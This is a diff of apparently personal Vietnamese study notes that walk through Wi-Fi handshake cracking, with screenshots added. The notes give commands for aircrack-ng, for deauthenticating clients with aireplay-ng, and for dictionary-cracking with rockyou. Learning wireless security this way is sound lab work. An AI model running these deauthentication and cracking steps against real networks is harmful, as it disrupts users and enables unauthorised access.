@@ -75,17 +75,24 @@ sudo airodump-ng <interface>
 
 1. Bật monitor mode của wifi adapter
 
-  
-  
-2. Mik sẽ cần bắt những packets đến AP
+  ![Screenshot from 2024-11-20 15-10-05](https://github.com/user-attachments/assets/4ea1853f-b59f-4baa-90e0-1b90315be718)
+
+3. Mik sẽ cần bắt những packets đến AP
   ```
   sudo airodump-ng --bssid <BSSID> --channel <CH> --write <output_file> wlan0mon
   ```
+  ![Screenshot from 2024-11-21 20-59-30](https://github.com/user-attachments/assets/6a2f33d1-9189-42a1-b089-a0f85d76e678)
+
+  ***Ở đây thì do mik đẫ tắt monitor mode nên nó sẽ ko hiện station (những máy kết nối tới AP)***
    
 3. Deauthicate bắt AP thực hiện 4hand-shake
   ```
   sudo aireplay-ng --deauth <# packets> -a <BSSID> -c <CLIENT-MAC> wlan0mon
   ```
+  ![Screenshot from 2024-11-21 20-57-08](https://github.com/user-attachments/assets/77cf81e7-0b46-4a7b-98e2-88304015d978)
+
+  ***Lưu ý: Mình cần phải có EAPOL protocol ms thực hiện đc***
+
 4. Tải rock_you.txt
 
   ```
@@ -96,6 +103,8 @@ sudo airodump-ng <interface>
   ```
   sudo aircrack-ng -w <dictionary_file> -b <BSSID> <capture_file>.cap
   ```
+  ![Screenshot from 2024-11-21 20-46-31](https://github.com/user-attachments/assets/bdd0147b-caae-404a-bb56-81d1558c8ffe)
+
 
 # Event Viewer
 ![image](https://github.com/user-attachments/assets/193d98d7-89db-4e70-b341-788858c64224)
